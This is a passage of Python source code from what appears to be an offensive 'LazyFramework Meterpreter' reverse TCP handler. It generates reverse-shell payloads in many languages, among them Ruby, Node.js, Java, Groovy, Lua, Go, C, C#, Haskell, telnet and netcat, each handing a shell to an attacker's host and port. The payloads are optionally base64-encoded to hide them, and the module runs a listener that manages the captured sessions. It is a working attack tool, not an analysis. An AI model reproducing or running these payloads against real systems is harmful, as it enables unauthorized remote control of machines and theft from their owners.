        payload_b64 = base64.b64encode(payload.encode()).decode()
        return "echo " + payload_b64 + " | base64 -d | perl"
    return payload

# --- Ruby ---
def generate_ruby(lhost, lport, level, use_b64):
    payload = f"ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",{lport});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
    if use_b64:
        payload_b64 = base64.b64encode(payload.encode()).decode()
        return f"echo {payload_b64} | base64 -d | ruby"
    return payload

def generate_ruby2(lhost, lport, level, use_b64):
    payload = f"ruby2 -rsocket -e 'c=TCPSocket.new(\"{lhost}\",{lport});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
    if use_b64:
        payload_b64 = base64.b64encode(payload.encode()).decode()
        return f"echo {payload_b64} | base64 -d | ruby2"
    return payload

# --- Node.js ---
def generate_nodejs(lhost, lport, level, use_b64):
    payload = f"node -e 'var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect({lport},\"{lhost}\",function()){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;'"
    if use_b64:
        payload_b64 = base64.b64encode(payload.encode()).decode()
        return f"echo {payload_b64} | base64 -d | node"
    return payload

# --- Java ---
def generate_java(lhost, lport, level, use_b64):
    java_code = f'''public class RevShell {{
    public static void main(String[] args) throws Exception {{
        String host = "{lhost}";
        int port = {lport};
        String cmd = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/sh";
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        java.net.Socket s = new java.net.Socket(host, port);
        java.io.InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        java.io.OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while (!s.isClosed()) {{
            while (pi.available() > 0) so.write(pi.read());
            while (pe.available() > 0) so.write(pe.read());
            while (si.available() > 0) po.write(si.read());
            so.flush(); po.flush();
            Thread.sleep(50);
        }}
        p.destroy(); s.close();
    }}
}}'''
    java_b64 = base64.b64encode(java_code.encode()).decode()
    payload = f'''echo {java_b64} | base64 -d > RevShell.java && javac RevShell.java && java RevShell'''
    if use_b64:
        p_b64 = base64.b64encode(payload.encode()).decode()
        return f'echo {p_b64} | base64 -d | sh'
    return payload

# --- Groovy ---
def generate_groovy(lhost, lport, level, use_b64):
    groovy_code = f'''new Thread() {{
    void run() {{
        try {{
            def host = "{lhost}"; def port = {lport}
            def cmd = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/sh"
            def s = new java.net.Socket(host, port)
            def p = "$cmd".execute()
            def threads = [
                Thread.start {{ s.getOutputStream() << p.getInputStream() }},
                Thread.start {{ p.getOutputStream() << s.getInputStream() }}
            ]
            threads.each {{ it.join() }}
        }} catch (Exception e) {{ e.printStackTrace() }}
    }}
}}.start()'''
    groovy_b64 = base64.b64encode(groovy_code.encode()).decode()
    payload = f'''echo {groovy_b64} | base64 -d > RevShell.groovy && groovy RevShell.groovy'''
    if use_b64:
        p_b64 = base64.b64encode(payload.encode()).decode()
        return f'echo {p_b64} | base64 -d | sh'
    return payload

# --- Lua ---
def generate_lua(lhost, lport, level, use_b64):
    lua_code = f'''local host = "{lhost}" local port = {lport}
local socket = require("socket")
local tcp = socket.tcp()
tcp:connect(host, port)
while true do
    local cmd = tcp:receive()
    if cmd then
        local f = io.popen(cmd)
        local output = f:read("*a")
        tcp:send(output)
    end
end'''
    lua_b64 = base64.b64encode(lua_code.encode()).decode()
    payload = f'''echo {lua_b64} | base64 -d | lua'''
    if use_b64:
        p_b64 = base64.b64encode(payload.encode()).decode()
        return f'echo {p_b64} | base64 -d | sh'
    return payload

# --- Golang ---
def generate_golang(lhost, lport, level, use_b64):
    go_code = f'''package main
import (
    "net"
    "os/exec"
)
func main() {{
    conn, _ := net.Dial("tcp", "{lhost}:{lport}")
    if conn != nil {{
        cmd := exec.Command("/bin/sh")
        cmd.Stdin = conn
        cmd.Stdout = conn
        cmd.Stderr = conn
        cmd.Run()
    }}
}}'''
    go_b64 = base64.b64encode(go_code.encode()).decode()
    payload = f'''echo {go_b64} | base64 -d > shell.go && go run shell.go'''
    if use_b64:
        p_b64 = base64.b64encode(payload.encode()).decode()
        return f'echo {p_b64} | base64 -d | sh'
    return payload

generate_go = generate_golang

# --- Dart ---
def generate_dart(lhost, lport, level, use_b64):
    dart_code = f'''import 'dart:io';
void main() async {{
    var socket = await Socket.connect("{lhost}", {lport});
    var process = await Process.start("/bin/sh", []);
    process.stdin.addStream(socket);
    socket.addStream(process.stdout);
    socket.addStream(process.stderr);
}}'''
    dart_b64 = base64.b64encode(dart_code.encode()).decode()
    payload = f'''echo {dart_b64} | base64 -d > shell.dart && dart shell.dart'''
    if use_b64:
        p_b64 = base64.b64encode(payload.encode()).decode()
        return f'echo {p_b64} | base64 -d | sh'
    return payload

# --- Telnet ---
def generate_telnet(lhost, lport, level, use_b64):
    payload = f"telnet {lhost} {lport} | /bin/sh | telnet {lhost} {lport}"
    if use_b64:
        payload_b64 = base64.b64encode(payload.encode()).decode()
        return f"echo {payload_b64} | base64 -d | sh"
    return payload

# --- C ---
def generate_c(lhost, lport, level, use_b64):
    c_code = f'''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main() {{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons({lport});
    inet_pton(AF_INET, "{lhost}", &addr.sin_addr);
    connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execl("/bin/sh", "sh", NULL);
    return 0;
}}'''
    c_b64 = base64.b64encode(c_code.encode()).decode()
    payload = f'''echo {c_b64} | base64 -d > shell.c && gcc -o shell shell.c && ./shell'''
    if use_b64:
        p_b64 = base64.b64encode(payload.encode()).decode()
        return f'echo {p_b64} | base64 -d | sh'
    return payload

# --- C# ---
def generate_csharp(lhost, lport, level, use_b64):
    csharp_code = f'''using System;
using System.Net.Sockets;
using System.Diagnostics;
class Shell {{
    static void Main() {{
        var client = new TcpClient("{lhost}", {lport});
        var process = new Process();
        process.StartInfo.FileName = "/bin/sh";
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardInput = true;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.Start();
        process.StandardInput.BaseStream.CopyTo(client.GetStream());
        client.GetStream().CopyTo(process.StandardOutput.BaseStream);
        process.WaitForExit();
    }}
}}'''
    csharp_b64 = base64.b64encode(csharp_code.encode()).decode()
    payload = f'''echo {csharp_b64} | base64 -d > shell.cs && mcs shell.cs && mono shell.exe'''
    if use_b64:
        p_b64 = base64.b64encode(payload.encode()).decode()
        return f'echo {p_b64} | base64 -d | sh'
    return payload

def generate_csharp_windows(lhost, lport, level, use_b64):
    csharp_code = f'''using System;
using System.Net.Sockets;
using System.Diagnostics;
class Shell {{
    static void Main() {{
        var client = new TcpClient("{lhost}", {lport});
        var process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardInput = true;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.Start();
        process.StandardInput.BaseStream.CopyTo(client.GetStream());
        client.GetStream().CopyTo(process.StandardOutput.BaseStream);
        process.WaitForExit();
    }}
}}'''
    csharp_b64 = base64.b64encode(csharp_code.encode()).decode()
    payload = f'''echo {csharp_b64} | base64 -d > shell.cs && csc shell.cs && shell.exe'''
    if use_b64:
        p_b64 = base64.b64encode(payload.encode()).decode()
        return f'echo {p_b64} | base64 -d | sh'
    return payload

# --- Haskell ---
def generate_haskell(lhost, lport, level, use_b64):
    haskell_code = f'''import Network
import System.IO
import System.Process
main = do
    h <- connectTo "{lhost}" (PortNumber {lport})
    (_, _, _, ph) <- createProcess (shell "/bin/sh") {{ std_in = UseHandle h, std_out = UseHandle h, std_err = UseHandle h }}
    waitForProcess ph'''
    haskell_b64 = base64.b64encode(haskell_code.encode()).decode()
    payload = f'''echo {haskell_b64} | base64 -d > shell.hs && runhaskell shell.hs'''
    if use_b64:
        p_b64 = base64.b64encode(payload.encode()).decode()
        return f'echo {p_b64} | base64 -d | sh'
    return payload

# --- Netcat ---
def generate_nc(lhost, lport, level, use_b64):
    payload = f"nc -e /bin/sh {lhost} {lport}"
    if use_b64:
        payload_b64 = base64.b64encode(payload.encode()).decode()
        return f"echo {payload_b64} | base64 -d | sh"
    return payload


# ==================== HELPER FUNCTIONS ====================

def send_command_to_session(session_id, command):
    with SESSIONS_LOCK:
        if session_id not in SESSIONS:
            return False
        session = SESSIONS[session_id]
    
    try:
        if hasattr(session, 'send_command_gui'):
            output = session.send_command_gui(command)
        else:
            output = session.send_command(command)
        if output and hasattr(session, '_gui_mode') and session._gui_mode:
            print(output)
        return True
    except Exception as e:
        print(f"[!] Error sending command: {e}")
        return False

def kill_session(session_id):
    with SESSIONS_LOCK:
        if session_id in SESSIONS:
            session = SESSIONS[session_id]
            session.close()
            del SESSIONS[session_id]
            print(f"[+] Session {session_id} killed")
            return True
    print(f"[-] Session {session_id} not found")
    return False

def stop_listener():
    global _LISTENER_INSTANCE
    with _LISTENER_LOCK:
        if _LISTENER_INSTANCE is not None:
            _LISTENER_INSTANCE.stop()
            _LISTENER_INSTANCE = None
            return True
    return False

def list_sessions():
    with SESSIONS_LOCK:
        return list(SESSIONS.keys())

def get_session(session_id):
    with SESSIONS_LOCK:
        return SESSIONS.get(session_id)

def check_session_alive(session_id):
    with SESSIONS_LOCK:
        if session_id not in SESSIONS:
            return False
        session = SESSIONS[session_id]
    if not hasattr(session, 'is_socket_alive'):
        return False
    return session.is_socket_alive()

def get_session_output(session_id, command):
    with SESSIONS_LOCK:
        if session_id not in SESSIONS:
            return "Session not found"
        session = SESSIONS[session_id]
    if hasattr(session, 'send_command_gui'):
        return session.send_command_gui(command)
    else:
        return session.send_command(command)

def get_session_info(session_id):
    with SESSIONS_LOCK:
        if session_id not in SESSIONS:
            return None
        session = SESSIONS[session_id]
    return {
        'id': session.id,
        'rhost': session.rhost,
        'rport': session.rport,
        'lhost': session.lhost,
        'lport': session.lport,
        'os': session.os,
        'hostname': session.hostname,
        'status': session.status,
        'created': session.created,
    }


# ==================== MAIN RUN FUNCTION ====================

def run(session, options):
    global _LISTENER_INSTANCE

    lhost = options.get("LHOST", "0.0.0.0")
    lport = int(options.get("LPORT", 4444))
    lang = str(options.get("LANGUAGE", "python")).lower()
    use_b64 = str(options.get("USE_BASE64", True)).lower() == "true"
    auto_handle = str(options.get("AUTO_HANDLE", True)).lower() == "true"
    gui_mode = str(options.get("GUI_MODE", True)).lower() == "true"

    # ===== HEADER =====
    _gui_print(session, "═" * 64, "yellow")
    _gui_print(session, "  LAZYFRAMEWORK METERPRETER - REVERSE TCP HANDLER v3.0", "bold yellow")
    _gui_print(session, "═" * 64, "yellow")
    _gui_print(session, f"  LHOST       : {lhost}", "green")
    _gui_print(session, f"  LPORT       : {lport}", "green")
    _gui_print(session, f"  LANGUAGE    : {lang}", "green")
    _gui_print(session, f"  USE_BASE64  : {use_b64}", "green")
    _gui_print(session, f"  AUTO_HANDLE : {auto_handle}", "green")
    _gui_print(session, f"  GUI_MODE    : {gui_mode}", "green")
    _gui_print(session, "═" * 64, "yellow")

    # ===== GENERATE PAYLOAD =====
    languages = {
        "python": generate_python,
        "python2": generate_python2,
        "python3": generate_python3,
        "bash": generate_bash,
        "powershell": generate_powershell,
        "php": generate_php,
        "perl": generate_perl,
        "ruby": generate_ruby,
        "ruby2": generate_ruby2,
        "nodejs": generate_nodejs,
        "java": generate_java,
        "groovy": generate_groovy,
        "lua": generate_lua,
        "golang": generate_golang,
        "go": generate_golang,
        "dart": generate_dart,
        "telnet": generate_telnet,
        "c": generate_c,
        "csharp": generate_csharp,
        "c#": generate_csharp,
        "haskell": generate_haskell,
        "nc": generate_nc,
        "netcat": generate_nc,
    }

    if lang != "none":
        _gui_print(session, "\n[+] GENERATED PAYLOADS:", "bold green")
        _gui_print(session, "─" * 64, "yellow")

        if lang == "all":
            for name, func in languages.items():
                payload = func(lhost, lport, "medium", use_b64)
                _gui_print(session, f"\n[{name.upper()}]", "cyan")
                _gui_print(session, payload, "white")
        elif lang in languages:
            payload = languages[lang](lhost, lport, "medium", use_b64)
            _gui_print(session, f"\n[{lang.upper()} PAYLOAD]", "cyan")
            _gui_print(session, payload, "white")
        else:
            _gui_print(session, f"[!] Language '{lang}' not supported", "red")
            _gui_print(session, f"[*] Supported: {', '.join(languages.keys())} | all | none", "yellow")

        _gui_print(session, "─" * 64, "yellow")

    # ===== STOP EXISTING LISTENER =====
    _gui_print(session, "\n[*] Checking for existing listener...", "yellow")
    with _LISTENER_LOCK:
        if _LISTENER_INSTANCE is not None:
            _gui_print(session, "[*] Stopping existing listener...", "yellow")
            _LISTENER_INSTANCE.stop()
            time.sleep(0.5)
            _LISTENER_INSTANCE = None
            _gui_print(session, "[+] Existing listener stopped", "green")

    # ===== START LISTENER THREAD =====
    _gui_print(session, f"\n[*] Starting listener thread on {lhost}:{lport}...", "yellow")

    listener = ReverseTCPListener(lhost, lport, auto_handle)
    listener.gui_mode = gui_mode
    
    if isinstance(session, dict):
        listener.gui_instance = session.get("gui_instance")
        if listener.gui_instance:
            print(f"[+] GUI instance set for listener")

    try:
        # ===== FIX: daemon=False agar thread tidak mati =====
        listener_thread = threading.Thread(target=listener.start, daemon=False)
        listener_thread.start()

        _gui_print(session, "[+] Listener started in background thread", "green")
        _gui_print(session, f"[+] Waiting for incoming connections on {lhost}:{lport}", "cyan")

        # ===== FIX: CLI mode - BLOCKING, tidak kembali ke prompt =====
        if not gui_mode:
            _gui_print(session, "[yellow]Press Ctrl+C to stop the listener[/yellow]", "yellow")
            try:
                # Tunggu sampai listener berhenti
                while listener.running:
                    time.sleep(0.5)
                listener_thread.join(timeout=2)
                return "[+] Reverse TCP listener stopped"
            except KeyboardInterrupt:
                _gui_print(session, "\n[yellow][*] Stopping listener...[/yellow]", "yellow")
                listener.stop()
                listener_thread.join(timeout=2)
                return "[+] Reverse TCP listener stopped by user"
        else:
            return f"[+] Reverse TCP listener running in background on {lhost}:{lport}"

    except Exception as e:
        _gui_print(session, f"[!] Failed to start listener: {e}", "red")
        import traceback
        traceback.print_exc()
        return f"[!] Listener startup failed: {e}"
